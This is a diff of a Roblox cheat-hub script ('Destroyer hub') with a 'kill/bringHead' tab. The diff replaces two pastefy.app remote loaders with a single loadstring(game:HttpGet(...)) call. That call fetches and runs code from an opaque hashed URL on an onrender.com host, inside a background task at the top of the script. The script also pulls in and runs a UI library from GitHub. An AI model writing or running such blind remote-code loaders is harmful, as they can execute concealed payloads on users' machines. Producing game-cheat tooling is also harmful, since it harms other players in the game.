@@ -1,9 +1,5 @@
 task.spawn(function()
-    loadstring(game:HttpGet("https://pastefy.app/eKTgXfHH/raw"))()
-end)
-
-task.spawn(function()
-    loadstring(game:HttpGet("https://pastefy.app/Sc1n4Ikh/raw"))()
+    loadstring(game:HttpGet("https://protected-roblox-scripts.onrender.com/a340f1720c5227c814c71d565f7149b0"))()
 end)
 
 local RixerLibrary = loadstring(game:HttpGet(('https://raw.githubusercontent.com/cnPthPiGon/CM9/refs/heads/main/Library.lua')))()
@@ -12,10 +8,10 @@ local Window = RixerLibrary:MakeWindow({
     Name = "Destroyer hub",
     HidePremium = false,
     SaveConfig = true,
-    ConfigFolder = "DestroyerHub" -- Met un nom personnalisé pour ton hub ici
+    ConfigFolder = "DestroyerHub"
 })
 
-print("the owner of the scripts is rixer95-x2 in youtube.") -- Just a debug
+print("the owner of the scripts is rixer95-x2 in youtube.")
 
 local Tab = Window:MakeTab({
     Name = "kill/bringHead",
